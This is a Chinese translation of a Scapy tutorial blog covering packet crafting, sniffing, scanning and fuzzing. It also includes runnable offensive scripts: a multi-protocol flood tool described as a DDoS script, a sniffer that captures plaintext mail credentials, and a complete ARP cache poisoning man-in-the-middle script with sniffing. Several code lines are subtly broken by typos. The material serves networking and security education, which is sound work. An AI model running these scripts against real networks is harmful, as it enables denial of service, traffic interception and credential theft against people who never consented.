# Scapy模块 (by bt3)


[Scapy](http://www.secdev.org/projects/scapy/)能够发现和捕捉几个不同协议的数据包，进行伪造和解码，以用于大多数的网络任务，比如扫描，示踪，探测，攻击和网络发现。

在这篇文章中，我将和你们讨论几个我最喜欢的脚本。但是，在我们开始之前，确保你的机器已经安装了Scapy模块。

```sh
$ pip install scapy
```

你可以通过反复启动Scapy来测试你的安装是否成功。这些是几个比较有用的函数：

```sh
$ scapy
Welcome to Scapy (2.2.0)
>>> ls()    ---> list protocols/layers
>>> lsc()   ---> list commands
>>> conf    ---> Display configurations
>>> help(sniff)     --> Help for a specific command
```

### 目录:

* [Scapy 101 (包括嗅探，扫描，模糊……)](#intro)
* [窃取明文邮件数据](#email)
* [ARP缓存感染](#arp)
* [加载PCAP文件](#pcap)


-----------------------------------------------

#<a name="intro"></a> Scapy 101 (包括嗅探，扫描，模糊……)

## 一个简单的包和它的头部

网络通信的一个基本单元是*包*。所以让我们创建一个！

Scapy通过*层*，然后通过每层的*字段*在构建包。每一层都被它的父层包裹，使用 **<** 和 **>** 表示。

让我们从指定数据包的源IP和目的IP开始。这种类型的信息将进入**IP头部**，IP属于[0SI模型](http://bt3gl.github.io/wiresharking-for-fun-or-profit.html)中的*第3层协议*:

```python
>>> ip = IP(src="192.168.1.114")
>>> ip.dst="192.168.1.25"
>>> pritnt ip
<IP  src=192.168.1.114 dst=192.168.1.25 |>
```

现在让我们加上*第4层协议*，比如**TCP**或者**UDP**。为了，我们使用**/**运算符(它被用作协议间的组合运算符)把这个头部和之前的相连接:

```python
>>> ip/TCP()
<IP  frag=0 proto=tcp src=192.168.0.1 dst=192.168.0.2 |<TCP  |>>
>>> tcp=TCP(sport=1025, dport=80)
>>> (tcp/ip).show()
###[ TCP ]###
  sport= 1025
  dport= www
  seq= 0
  ack= 0
  dataofs= None
  reserved= 0
  flags= S
  window= 8192
  chksum= None
  urgptr= 0
  options= {}
###[ IP ]###
     version= 4
     ihl= None
     tos= 0x0
     len= None
     id= 1
     flags=
     frag= 0
     ttl= 64
(...)
```

我们甚至可以做更多，加上*第二层协议*，比如**Ethernet**或者**IEEE 802.11**：

```
>>> Ether()/Dot1Q()/IP()
<Ether  type=0x8100 |<Dot1Q  type=0x800 |<IP  |>>>
>>> Dot11()/IP()
<Dot11  |<IP  |>>
```



### 发送一个数据包: 第2层 vs. 第3层

既然我们已经有了一个(非常简单的)数据包，我们可以通过网络发送它。

Scapy'的[send方法](http://www.secdev.org/projects/scapy/doc/usage.html#sending-packets)被用来向目标IP发送一个简单的数据包。这是一个*第3层*的操作，所以路由是基于本地表： 

```
>>> send(ip/tcp)
.
Sent 1 packets.
```


但Scapy[sendp方法](http://www.secdev.org/projects/scapy/doc/usage.html#sending-packets)是在*第2层*工作的:

```
>>> sendp(Ether()/ip/tcp)
.
Sent 1 packets.
```


### 发送一个ICMP包

现在让我们给我们的包加上一些内容。一个带消息的ICMP包是这样的：

```python
from scapy.all import *
packet = IP(dst="192.168.1.114")/ICMP()/"Helloooo!"
send(packet)
packet.show()
```

注意 **show()** 方法给出了这个包的细节。运行上面的代码会得到如下结果：

```sh
$ sudo python send_packet.py
.
Sent 1 packets.
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  proto     = icmp
  chksum    = None
  src       = 192.168.1.114
  dst       = 192.168.1.114
  \options   \
###[ ICMP ]###
     type      = echo-request
     code      = 0
     chksum    = None
     id        = 0x0
     seq       = 0x0
###[ Raw ]###
        load      = 'Helloooo!'
```


这就是在[Wireshark]()中的包:
![](http://i.imgur.com/jjuWHaZ.png)

为了多次发送一个包，我们在 **send** 方法中加上了 **loop=1** 参数：

```python
send(packet, loop=1)
```

在Wireshark中:

![](http://i.imgur.com/lv89lc3.png)


###  发送并接收一个包

Scapy还可以侦听发送包的响应（比如，ICMPping请求）。

在send中，根据网络层的不同，Scapy有两种发送包和接收包的类型。

在*第3层* ，方法是[sr和sr1](http://www.secdev.org/projects/scapy/doc/usage.html#send-and-receive-packets-sr)。前一个会返回已应答和未应答的包，后面一个只返回应答包和发送包。

在*第2层*，方法是[srp和srp1](http://www.secdev.org/projects/scapy/doc/usage.html#discussion)。前一个会返回已应答和未应答的包，后面一个只返回应答包和发送包。

一个很好的记住它们之间的区别的方法就是函数名中带**1**是用来发送特定包的，并且会**接收到一个回复/响应之后终**(而不是**持续地侦听回复/响应**）。


### 发送并接收一个ICMP包

让我们构建一个带有ICMP头的IP包(有默认类型的回升请求)，并使用 **sr()** 函数来传递包并记录任何应答：

```python
from scapy.all import *
output=sr(IP(dst='google.com')/ICMP())
print '\nOutput is:' + output
result, unanswered=output
print '\nResult is:' + result
```

运行这个代码会得到如下结果：

```sh
$ sudo python receive_packet.py
Begin emission:
.Finished to send 1 packets.
*
Received 2 packets, got 1 answers, remaining 0 packets

Output is:
(<Results: TCP:0 UDP:0 ICMP:1 Other:0>, <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>)

Result is:
[(<IP  frag=0 proto=icmp dst=74.125.228.40 |<ICMP  |>>, <IP  version=4L ihl=5L tos=0x0 len=28 id=9762 flags= frag=0L ttl=53 proto=icmp chksum=0x6eff src=74.125.228.40 dst=192.168.1.114 options=[] |<ICMP  type=echo-reply code=0 chksum=0x0 id=0x0 seq=0x0 |>>)]
```


### 循环发送和接收

要是我们想要发送同一个包的多个副本并侦听应答呢？我们可以使用[srloop()方法](http://www.secdev.org/projects/scapy/doc/usage.html#send-and-receive-in-a-loop)和一个 **count** 值来完成：

```sh
>>> srloop(IP(dst="www.goog")/ICMP(), count=3)
RECV 1: IP / ICMP 74.125.228.51 > 192.168.1.114 echo-reply 0
RECV 1: IP / ICMP 74.125.228.51 > 192.168.1.114 echo-reply 0
RECV 1: IP / ICMP 74.125.228.51 > 192.168.1.114 echo-reply 0

Sent 3 packets, received 3 packets. 100.0% hits.
```

----
## TCP三次握手

Scapy允许你建立SYN请求并匹配相应的返回[SYN/ACK](http://en.wikipedia.org/wiki/Transmission_Control_Protocol)段。

它是这样运作的：

1) 创建一个IP头部实例：

```
ip = IP(src='192.168.1.114', dst='192.168.1.25')
```

2) 定义一个TCP头部的SYN实例：

```
tcp_syn = TCP(sport=1024, dport=80, flags='S', seq=12345)
```

3) 发送这个并且使用**sr1**捕捉服务器的应答：

```
packet = ip/tcp_syn
SYNACK = sr1(packet)
```

4) 使用**SYNACK.seq**，提取服务器的TCP序列号，并加上1：

```
ack = SYNACK.seq + 1
```

5) 创建一个TCP头**ACK**的新实例，有标识**A** （赋给它服务器的确认值），然后发送所有东西：

```
tcp_ack = TCP(sport=1024, dport=80, flags='A', seq=12346, ack=ack)
send(ip/tcp_ack)
```

6) 最后，我们发送一个没有TCP标识或payload的段并将他发送回去：

```python
tcp_push = TCP(sport=1024, dport=80, flags='', seq=12346, ack=ack)
data = "HELLO!"
send(ip/tcp_push/data)
```


但是，运行上面的代码并不能成功！

原因在于使用Scapy创建TCP会话绕过了本机TCP/IP堆栈。既然主机并没有意识到Scapy正在发送包，本地主机将会收到一个自发的，没有和任何已知开放的会话/套接字相连接的SYN/ACK。这将会导致主机在接收到SYN/ACK之后重置连接。

一种解决方法是通过[iptables](http://en.wikipedia.org/wiki/Iptables)使用主机的防火墙来防止向外的重置。比如说，为了丢弃所有TCP和从192.168.1.114发往192.168.1.25，端口号为80的向外发送的包，我们执行：

```sh
$ sudo iptables -A OUTPUT -p tcp -d 192.168.1.25 -s 192.168.1.114 --dport 80 --tcp-flags RST -j DROP
```

这并不会阻止每当源主机收到一个来自会话的包时的重置，但它会阻止它进行重置。



---
##  网络扫描和嗅探

让我们学习如何进行一个简单的**端口扫描**。这可以通过向1-1024范围内的所有端口发送一个TCP标识设置为SYM的TCP/IP包来构建(这将花费几分钟来扫描):

```python
res, unans = sr( IP(dst='192.168.1.114')/TCP(flags='S', dport=(1, 1024)))
```

我们可以这样检查输出：

```python
res.summary()
```

想知道更多的内容，查看[在选定的端口中扫描子网的脚本](https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Network_and_802.11/scapy/super_scanner.py).

### Sniff()方法


在Scapy中，数据包的嗅探可以使用函数[sniff()](http://www.secdev.org/projects/scapy/doc/usage.html#sniffing)来完成。**iface**参数告诉嗅探器要嗅探哪个网络接口。**count**参数指明我们需要嗅探多少个包(空值表示无限多个)。 **timeout** 参数在给定时间够停止嗅探：

```python
>>>> p = sniff(iface='eth1', timeout=10, count=5)
>>>> print p.summary()
```

我们也可以指定过滤器：

```
>>>> p = sniff(filter="tcp and (port 25 or port 110)")
```

我们也可以对每个包使用**sniff**加上一个特定的callback函数来匹配过滤器，使用 **prn** 参数：

```python--
def packet_callback(packet):
    print packet.show()

sniff(filter='icmp', iface='eth1', prn=packet_callback, count=1)
```

为了实时查看输出并将数据放入一个文件中，我们使用带有  **summary** 和 **wrpcap** 方法的 **lambda函数** ：

```python
>>>> p = sniff(filter='icmp', iface='eth1', timeout=10, count=5,  prn = lambda x:x.summary())
>>>> wrpcap('packets.pcap', p)
```



----
## 更改路由表

我们使用Scapy的 **conf.route** 命令来查看我们的机器的路由表command :

```
Network         Netmask         Gateway         Iface           Output IP
127.0.0.0       255.0.0.0       0.0.0.0         lo              127.0.0.1
0.0.0.0         0.0.0.0         192.168.1.1     wlp1s0          192.168.1.114
192.168.1.0     255.255.255.0   0.0.0.0         wlp1s0          192.168.1.114
```

Scapy允许我们将指定的路由放在这个表中，因此任何发往指定主机的包将通过指定的网关：

```python
>>>> conf.route.add(host='192.168.118.2', gw='192.168.1.114')
Network         Netmask         Gateway         Iface           Output IP
127.0.0.0       255.0.0.0       0.0.0.0         lo              127.0.0.1
0.0.0.0         0.0.0.0         192.168.1.1     wlp1s0          192.168.1.114
192.168.1.0     255.255.255.0   0.0.0.0         wlp1s0          192.168.1.114
192.168.118.2   255.255.255.255 192.168.1.114   lo              192.168.1.114
```

最后，要恢复原始配置，使用 ```conf.route.resync()```.


---

## 其他有用的东西

### 以十六进制形式转储二进制数据

一个非常有用的函数是[hexdump()](https://pypi.python.org/pypi/hexdump)，它可以用来显示一个或多个使用hexdump格式的数据包：

```
from scapy.all import *
str(IP())
a = Ether()/IP(dst="www.google.com")/TCP()/"GET /index.html HTTP/1.1"
hexdump(a)
```

运行这个代码会得到：

```sh
$ sudo python example_hexdump.py
WARNING: No route found for IPv6 destination :: (no default route?)
0000   00 90 A9 A3 F1 46 A4 17  31 E9 B3 27 08 00 45 00   .....F..1..'..E.
0010   00 40 00 01 00 00 40 06  8D 0F C0 A8 01 72 4A 7D   .@....@......rJ}
0020   E1 10 00 14 00 50 00 00  00 00 00 00 00 00 50 02   .....P........P.
0030   20 00 FA 15 00 00 47 45  54 20 2F 69 6E 64 65 78    .....GET /index
0040   2E 68 74 6D 6C 20 48 54  54 50 2F 31 2E 31         .html HTTP/1.1
```



###  fuzzing

Scapy的[fuzz()](http://www.secdev.org/projects/scapy/doc/usage.html#fuzzing)方法允许我们建立fuzzing模板(通过随机变更默认值并循环发送）。

比如说，我们有一个标准的IP层和被fuzz的UDP和NTP层。下面的程序中，UDP目的端口被版本号为4的NTP重载。

```python
>>> send(IP(dst="192.168.1.114")/fuzz(UDP()/NTP(version=4)), loop=1)
................^C
Sent 16 packets.
```

这是一个DNS fuzzer:

```python
>>> send(IP(dst='192.168.1.114')/UDP()/fuzz(DNS()), inter=1,loop=1)
```

我们可以使用fuzzer来做一些更加有趣的事情。比如说，构建一个[DDOS](http://en.wikipedia.org/wiki/Denial-of-service_attack)脚本。这是我的respository里面的一个非常简单的例子：

```python
import threading
import socket
from scapy.all import *

def synFlood(target, port):
    ip = fuzz(IP(dst=target))
    syn = fuzz(TCP(dport=port, flags='S'))
    send(ip/syn, verbose=0)

def tcpFlood(target, port):
    ip = fuzz(IP(dst=target))
    tcp = fuzz(TCP(dport=port))
    send(ip/tcp, verbose=0)

def udpFlood(target, port):
    ip = fuzz(IP(dst=target))
    udp = fuzz(UDP(dport=port))
    send(ip/udp, verbose=0)

def icmpFlood(target):
    ip = fuzz(IP(dst=target))
    icmp = fuzz(ICMP())
    send(ip/icmp, verbose=0)

def option(count, op, ip, port):
    if op == '1':
        for i in range(count):
            threading.Thread(target=synFlood(ip, port)).start()

    elif op == '2':
        for i in range(count):
            threading.Thread(target=tcpFlood(ip, port)).start()

    elif op == '3':
        for i in range(count):
            threading.Thread(target=udpFlood(ip, port)).start()

    elif op == '4':
        for i in range(count):
            threading.Thread(target=icmpFlood(ip)).start()

    else:
        print "Option not valid."
        sys.exit()

def getIP(domainName):
    return socket.gethostbyname(domainName)

if __name__ == '__main__':
    domainName = raw_input('Type the domain name: ')
    port = raw_input('Type the port: ')
    op = raw_input("Select the flood attack type: 1) syn, 2) tcp, 3)udp, 4) icmp ")
    count = raw_input("Select the count: ")
    ip = getIP(domainName)
    option(int(count), op, ip, port)
```

### Ping网络

使用Scapy，我们可以使用不同的协议执行 **ping** 命令。最快的发现本地以太网中的主机的方法是使用ARP：

```python
def arp_ping(host):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=host), timeout=2)
    ans.summary(lambda (s, r): r.sprintf("%Ether.src% %ARP.psrc%"))
```

在其他情况下，我们可以使用ICMP ping:

```python
def icmp_ping(host):
    ans, unans = sr(IP(dst=host)/ICMP())
    ans.summary(lambda (s, r): r.sprintf("%IP.src% is alive"))
```

当ICMP回应请求被阻止时，我们仍然可以使用TCP:

```python
def tcp_ping(host, port):
    ans, unans = sr(IP(dst=host)/TCP(dport=port, flags="S"))
    ans.summary(lambda(s, r): r.sprintf("%IP.src% is alive"))
```

或者甚至是UDP(从实时主机发出ICMP端口不可达的错误)。我们可以选择最有可能被关闭的端口，比如端口0：

```python
def udp_ping(host, port=0):
    ans, unans = sr(IP(dst=host)/UDP(dport=port))
    ans.summary(lambda(s, r): r.sprintf("%IP.src% is alive"))
```



### More Networking

Scapy可以执行简单的网络功能，比如[traceroute](http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute-2):

```python
>>>> print scapy.traceroute('www.google.com')
```

或者使用[arping](http://www.secdev.org/projects/scapy/doc/usage.html#arp-ping)在本地以太网中发现主机:

```python
>>>> print arping('192.168.1.114')
```

Scapy也有像[arpcachepoison和srpflood](http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute)这样基于网络的攻击的命令行。


另外，我们可以使用Scapy来重建已被嗅探或接收的包。 **command()** 方法会返回此任务所需的命令行字符串。它的结果和 **show()** 命令相同。


### 绘图

如果你安装了[GnuPlot](http://www.gnuplot.info/)，你可以使用Scapy的绘图功能。它非常简洁。

同样，我们也可以使用**plot()** 和 **graph()** 函数来绘图，我们可以使用**trace3D()**生成3D的图。



### 很好的第三方模块

[Fingerprinting](http://nmap.org/book/osdetect-fingerprint-format.html) 可以使用 **nmap_fp()** 模块(来自[Nmap](http://nmap.org)v4.23之前的版本):

```python
>>> load_module("nmap")
>>> nmap_fp("192.168.0.114")
```
[Passive OS fingerprinting](http://www.netresec.com/?page=Blog&month=2011-11&post=Passive-OS-Fingerprinting)可以使用 **p0f** 模块:

```python
>>>> load_module('p0f')
>>>> sniff(prn=prnp0f)
```




-----------
## <a name="email"></a> 窃取明文邮件数据

这个脚本的想法是构建一个嗅探器来捕获[SMTP](http://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol)，[POP3](http://en.wikipedia.org/wiki/Post_Office_Protocol)，和[IMAP](http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol)凭据。一旦我们将这个嗅探器和一些[MITM](http://en.wikipedia.org/wiki/Man-in-the-middle_attack)攻击(例如**ARP感染**)相结合，我们就可以从其他机器里面窃取凭据。

知道了这一点，我们编写了一个在所有接口上运行的，没有过滤器的嗅探器。**Sniff**的**store=0**属性确保数据包不保存在内存中（所以我们可以运行它）：

```python
from scapy.all import *
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: ' + packet[IP].dst
            print '[*] ' + packet[TCP].payload

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
```

当加载一些邮件客户端(比如[Thunderbird](https://www.mozilla.org/en-US/thunderbird/)）时运行这个脚本，我们可以看见登录信息(如果它们明文发送给服务器，就是有用的)。



-----------
## <a name="arp"></a> ARP缓存感染

我在Wireshark指南中谈到了[使用命令行arpspoof造成ARP缓存感染](http://bt3gl.github.io/wiresharking-for-fun-or-profit.html)。这里我们来看一下如何使用Scapy来实现同样的工具。

ARP缓存感染的主要机制就是向目标机器证明我们是网管，然后向网关证明所有的流量应该从我们的机器经过。

网络中的每一个机器都会有一个ARP缓存，用于存储最近的与本地网络上的IP地址匹配的MAC地址。我们需要做的就是用受控制的内容来“感染”这个缓存。

最好的测试方法就是使用一个Windows的虚拟机(看一下[我写的这个指南](http://bt3gl.github.io/setting-up-a-playing-environment-with-virtual-machines.html)).

在攻击之前，进入windows窗口，打开终端(```cmd```)，并使用```ipconfig```检查IP和网关IP地址。然后使用```arp -a```检查关联的ARP缓存条目的MAC地址：

![](http://i.imgur.com/ME069uS.png)

我们的ARP缓存感染脚本会按照如下步骤实现(基于[Black Hat Python](http://www.nostarch.com/blackhatpython))：

1. 定义常量，设置接口卡，然后关闭输出。

2. 解析网关和目标MAC地址。**get_mac**函数的**srp**方法向IP地址发出ARP请求来解析MAC地址。

3. 启动感染线程来执行ARP感染攻击。浙江启动抓包的嗅探器。**poison_target**函数建立ARP请求，以感染目的IP和网关（使用循环）。

4. 记录抓到的包并恢复网络。**restore_target**函数把ARP数据包发送到网络广播地址，以重置网关和目标及其的ARP缓存。


```python
from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

INTERFACE       =   'wlp1s0'
TARGET_IP       =   '192.168.1.107'
GATEWAY_IP      =   '192.168.1.1'
PACKET_COUNT    =   1000

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print '[*] Restoring targets...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print '[*] Beginning the ARP poison. [CTRL-C to stop]'
    while 1:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print '[*] ARP poison attack finished.'
    return

if __name__ == '__main__':
    conf.iface = INTERFACE
    conf.verb = 0
    print "[*] Setting up %s" % INTERFACE
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if GATEWAY_MAC is None:
        print "[-] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC)

    TARGET_MAC = get_mac(TARGET_IP)
    if TARGET_MAC is None:
        print "[-] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC)

    poison_thread = threading.Thread(target = poison_target, args=(GATEWAY_IP, GATEWAY_MAC, \
        TARGET_IP, TARGET_MAC))
    poison_thread.start()

    try:
        print '[*] Starting sniffer for %d packets' %PACKET_COUNT
        bpf_filter = 'IP host ' + TARGET_IP
        packets = sniff(count=PACKET_COUNT, iface=INTERFACE)
        wrpcap('results.pcap', packets)
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)

    except Scapy_Exception as msg:
        print msg, "Hi there!!"

    except KeyboardInterrupt:
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
        sys.exist()
```

为了运行ARP缓存感染脚本，我们需要告诉本地主机(Kali Linux)向网关和目的IP转发数据包：

```sh
$ echo 1 /proc/sys/net/ipv4/ip_foward
```

最后，我们运行这个脚本，会得到如下输出：

```
$ sudo python arp_cache_poisoning.py
[*] Setting up wlp1s0
[*] Gateway 192.168.1.1 is at 00:90:a9:a3:f1:46
[*] Target 192.168.1.107 is at 00:25:9c:b3:87:c4
[*] Beginning the ARP poison. [CTRL-C to stop]
[*] Starting sniffer for 1000 packets
[*] ARP poison attack finished.
[*] Restoring targets...
```

运行过程中，我们将看到受攻击主机(Windows)的变化：

![](http://i.imgur.com/RFdIz4H.png)

一旦你完成了，打开这个脚本生成的PCAP文件。BAM！受攻击主机的整个网络流量数据都在你手中了！






------
## <a name="pcap"></a> 加载PCAP文件

我们已经学习了如何从邮件协议中窃取凭据。现在让我们将这项功能扩展到所有网络流量数据中！

### PCAP文件的处理

使用**wrpacp**保存数据包：

```python
wrpcap('packets.pcap', p)
```

使用**rdpcap**阅读数据包：

```python
p = rdpcap('packets.pcap', p)
p.show()
```

### 搭建环境

基于[Black Hat Python]()中的一个示例，我们将分析在PCAP文件中转储的HTTP流量中的图像。我们可以使用[opencv](http://opencv.org/)库来完成。另外还需要安装[numpy](http://www.numpy.org/)和[scipy](http://www.scipy.org/):

```sh
$ sudo pip install numpy
$ sudo pip install scipy
$ sudo yum install opencv-python
```

我们将看到一个试图使用人脸检测图像的脚本。但是，首先，使用这些图像创建或下载PCAP文件。例如，这里有一些在线的PCAP转储资源：
[here](http://wiki.wireshark.org/SampleCaptures), [here](http://www.netresec.com/?page=PcapFiles), [here](http://www.pcapr.net/home), and [here](http://www.pcapr.net/browse?q=facebook+AND+png).

### 分析PCAP文件

现在我们准备从HTTP流量转储中识别人脸。我们的脚本大概完成以下步骤：

1) **http_assembler**取出PCAP文件，并以字典序分离每个TCP会话。然后使用HTTP过滤器循环这些部分(和Wireshark中的*Follow the TCP stream*相同)。在HTTP数据被汇编之后，使用**get_http_headers**函数解析头部信息，并发送给 **extract_image** 函数。如果返回了图像头部，它们将被保存并发送给 **face_detect** 函数。

```python
def http_assembler(PCAP):
    carved_images, faces_detected = 0, 0
    p = rdpcap(PCAP)
    sessions = p.sessions()
    for session in sessions:
        http_payload = ''
        for packet in sessions[session]:
            try:
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    http_payload += str(packet[TCP].payload)
            except:
                pass
            headers = get_http_headers(http_payload)
            if headers is None:
                continue

            image, image_type = extract_image(headers, http_payload)
            if image is not None and image_type is not None:
                file_name = '%s-pic_carver_%d.%s' %(PCAP, carved_images, image_type)
                fd = open('%s/%s' % (PIC_DIR, file_name), 'wb')
                fd.write(image)
                fd.close()
                carved_images += 1
                try:
                    result = face_detect('%s/%s' %(PIC_DIR, file_name), file_name)
                    if result is True:
                        faces_detected += 1
                except:
                    pass
    return carved_images, faces_detected
```

2) **get_http_headers**函数使用regex分割头部以找到**'Content-Type'**:

```python
def get_http_headers(http_payload):
    try:
        headers_raw = http_payload[:http_payload.index("\r\n\r\n")+2]
        headers = dict(re.findall(r'(?P<name>.*?):(?P<value>.*?)\r\n', headers_raw))
    except:
        return None
    if 'Content-Type' not in headers:
        return None
    return headers
```

3) **extract_image**从HTTP包中提取数据，必要的时候解压缩：

```python
def extract_image(headers, http_payload):
    image,image_type = None, None
    try:
        if 'image' in headers['Content-Type']:
            image_type = headers['Content-Type'].split('/')[1]
            image = http_payload[http_payload.index('\r\n\r\n')+4:]
            try:
                if 'Content-Encoding' in headers.keys():
                    if headers['Content-Encoding'] == 'gzip':
                        image = zlib.decompress(image, 16+zlb.MAX_WBITS)
                    elif headers['Content-Encoding'] == 'deflate':
                        image = zlib.decompress(image)
            except:
                pass
    except:
        return None, None
    return image, image_type
```

4) 最后，**face_detect** 函数使用 **opencv** 库来使用一个专门用于面部识别的分类器。它会在脸部位置显示一个矩形坐标，然后储存最终的图像(顺便说一下，除了面部识别，你也可以在 [这里](http://alereimondo.no-ip.org/OpenCV/34)找到其它类型的图像分类器）：

```python
def face_detect(path, file_name):
    img = cv2.imread(path)
    cascade = cv2.CascadeClassifier('haarcascade_upperbody.xml')
    rects = cascade.detectMultiScale(img, 1.3, 4, cv2.cv.CV_HAAR_SCALE_IMAGE, (20,20))
    if len(rects) == 0:
        return False
    rects[:, 2:] += rects[:, :2]
    for x1, y1, x2, y2 in rects:
        cv2.retangle(img, (x1, y1), (x2, y2), (127, 255,0), 2)
        cv2.imwrite('%s/%s-%s' % (FACES_DIR, PCAP, file_name), img)
    return True
```


运行这个代码会得到如下结果：

```sh
Extracted: 165 images
Detected: 16 faces
```







-----


## 更多参考资料:

- [Scapy Documentation](http://www.secdev.org/projects/scapy/doc/).
- [Scapy Advanced Usage](http://www.secdev.org/projects/scapy/doc/advanced_usage.html)
- [Scapy Examples](http://www.secdev.org/projects/scapy/doc/usage.html).
- [Wifitap: PoC for communication over WiFi networks using traffic injection](http://sid.rstack.org/static/articles/w/i/f/Wifitap_EN_9613.html).
- [SurfJack: hijack HTTP connections to steal cookies](https://code.google.com/p/surfjack/)
- [Black Hat Python](http://www.nostarch.com/blackhatpython).
- [Making a xmas tree packet](http://thepacketgeek.com/scapy-p-08-making-a-christmas-tree-packet/).
